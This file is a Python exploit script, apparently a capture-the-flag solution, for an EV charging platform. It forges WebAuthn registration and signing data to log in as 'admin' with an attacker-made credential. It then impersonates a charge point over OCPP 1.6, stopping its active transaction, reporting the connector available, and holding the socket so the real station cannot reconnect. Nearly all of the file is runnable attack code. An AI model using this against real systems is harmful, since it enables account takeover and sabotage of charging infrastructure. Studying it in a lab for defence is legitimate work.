#!/usr/bin/env python3
"""
Impersonate Monastiraki Station, stop its transaction, hold the connection
open for 60s so the real station can't reconnect, then grab the flag.
"""

import asyncio
import hashlib
import json
import os
import struct
import sys
import time
import cbor2
import websockets
from base64 import urlsafe_b64encode
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes

import requests

BASE_URL  = "http://<target-ip>:<target-http-port>"
OCPP_URL  = "ws://<target-ip>:<target-ocpp-port>/a8e1d4c9-52f7-4b3a-b6e0-9d2c8f1a7e35"
CP_ID     = "a8e1d4c9-52f7-4b3a-b6e0-9d2c8f1a7e35"
TXN_ID    = 1001
HOLD_SECS = 70  # hold a bit longer than required


# ── WebAuthn helpers ──────────────────────────────────────────────────────────

def b64u_enc(data):
    return urlsafe_b64encode(data).rstrip(b"=").decode()


def make_cdj(typ, chal):
    return json.dumps(
        {"type": typ, "challenge": chal, "origin": BASE_URL, "crossOrigin": False},
        separators=(",", ":"),
    ).encode()


def rp_hash():
    return hashlib.sha256(b"<target-ip>").digest()


def cose_key(pub):
    n = pub.public_numbers()
    return cbor2.dumps({1: 2, 3: -7, -1: 1,
                        -2: n.x.to_bytes(32, "big"),
                        -3: n.y.to_bytes(32, "big")})


def make_ad_reg(cid, pub):
    return (rp_hash() + bytes([0x41]) + struct.pack(">I", 0)
            + b"\x00" * 16 + struct.pack(">H", len(cid)) + cid + cose_key(pub))


def make_ad_auth():
    return rp_hash() + bytes([0x01]) + struct.pack(">I", 1)


def do_login():
    priv = ec.generate_private_key(ec.SECP256R1())
    pub  = priv.public_key()
    cid  = os.urandom(20)
    uname = "pwn" + os.urandom(4).hex()

    rs = requests.Session()
    r  = rs.post(f"{BASE_URL}/register/begin", json={"username": uname})
    ch = r.json()["challenge"]
    cdj = make_cdj("webauthn.create", ch)
    ao  = cbor2.dumps({"fmt": "none", "attStmt": {},
                       "authData": make_ad_reg(cid, pub)})
    rs.post(f"{BASE_URL}/register/complete", json={
        "credentialId":      b64u_enc(cid),
        "clientDataJSON":    b64u_enc(cdj),
        "attestationObject": b64u_enc(ao),
    })

    ls = requests.Session()
    r2 = ls.post(f"{BASE_URL}/login/begin", json={"username": "admin"})
    ch2 = r2.json()["challenge"]
    cdj2 = make_cdj("webauthn.get", ch2)
    ad   = make_ad_auth()
    sig  = priv.sign(ad + hashlib.sha256(cdj2).digest(), ec.ECDSA(hashes.SHA256()))
    r3 = ls.post(f"{BASE_URL}/login/complete", json={
        "credentialId":      b64u_enc(cid),
        "clientDataJSON":    b64u_enc(cdj2),
        "authenticatorData": b64u_enc(ad),
        "signature":         b64u_enc(sig),
    })
    assert r3.json().get("username") == "admin", f"Login failed: {r3.json()}"
    print("[+] Authenticated as admin")
    return ls


# ── OCPP helpers ──────────────────────────────────────────────────────────────

def now_iso():
    return time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())


async def send(ws, msg_id, action, payload):
    msg = json.dumps([2, msg_id, action, payload])
    await ws.send(msg)
    return msg


async def recv_msg(ws, timeout=5):
    try:
        raw = await asyncio.wait_for(ws.recv(), timeout=timeout)
        return json.loads(raw)
    except asyncio.TimeoutError:
        return None


# ── Main ─────────────────────────────────────────────────────────────────────

async def ocpp_session(flag_holder):
    ws = await websockets.connect(OCPP_URL, subprotocols=["ocpp1.6"])
    print("[+] OCPP connected — kicking real station")

    # Boot
    await send(ws, "boot1", "BootNotification", {
        "chargePointModel":        "VoltGrid-CP-X",
        "chargePointVendor":       "VoltGrid Energy",
        "chargePointSerialNumber": "FAKE-0001",
        "firmwareVersion":         "2.4.1",
    })
    r = await recv_msg(ws)
    print("[+] Boot:", r)

    # Stop the active transaction
    await send(ws, "stop1", "StopTransaction", {
        "transactionId": TXN_ID,
        "timestamp":     now_iso(),
        "meterStop":     20000,
        "reason":        "Remote",
        "idTag":         "RFID-A7B3C9D1",
    })
    r = await recv_msg(ws)
    print("[+] StopTransaction:", r)

    # Notify: connector 1 is now Available
    await send(ws, "sn1", "StatusNotification", {
        "connectorId": 1,
        "status":      "Available",
        "errorCode":   "NoError",
        "timestamp":   now_iso(),
    })
    r = await recv_msg(ws)
    print("[+] StatusNotification:", r)

    start = time.time()
    print(f"[+] Holding connection open for {HOLD_SECS}s …")

    while time.time() - start < HOLD_SECS:
        elapsed = time.time() - start
        # Send heartbeat every 10s
        await send(ws, f"hb{int(elapsed)}", "Heartbeat", {})
        r = await recv_msg(ws, timeout=2)
        if r:
            msg_type = r[0] if r else None
            if msg_type == 2:          # CALL from server (e.g. RemoteStartTransaction)
                action = r[2]
                call_id = r[1]
                print(f"[!] Server CALL: {action} — rejecting")
                # Reply with Rejected
                rej = json.dumps([3, call_id, {"status": "Rejected"}])
                await ws.send(rej)
            else:
                print(f"    heartbeat ack at t+{elapsed:.0f}s")

        remaining = HOLD_SECS - (time.time() - start)
        print(f"    t+{time.time()-start:.0f}s remaining={remaining:.0f}s | flag_holder={flag_holder[0]!r}")
        if flag_holder[0]:
            break
        await asyncio.sleep(8)

    await ws.close()
    print("[+] OCPP connection closed.")


async def poll_flag(sess, flag_holder):
    for _ in range(15):
        try:
            r = sess.get(f"{BASE_URL}/api/flag")
            data = r.json()
            elapsed  = data.get("elapsed", 0)
            required = data.get("required", 60)
            flag     = data.get("flag")
            print(f"[flag] elapsed={elapsed:.1f}/{required}s  flag={flag!r}")
            if flag:
                flag_holder[0] = flag
                return
        except Exception as e:
            print(f"[flag] error: {e}")
        await asyncio.sleep(10)


async def main():
    sess = do_login()
    flag_holder = [None]

    await asyncio.gather(
        ocpp_session(flag_holder),
        poll_flag(sess, flag_holder),
    )

    if flag_holder[0]:
        print("\n" + "="*60)
        print(f"FLAG: {flag_holder[0]}")
        print("="*60)
    else:
        # Final check
        r = sess.get(f"{BASE_URL}/api/flag")
        print("Final flag check:", r.json())


if __name__ == "__main__":
    asyncio.run(main())
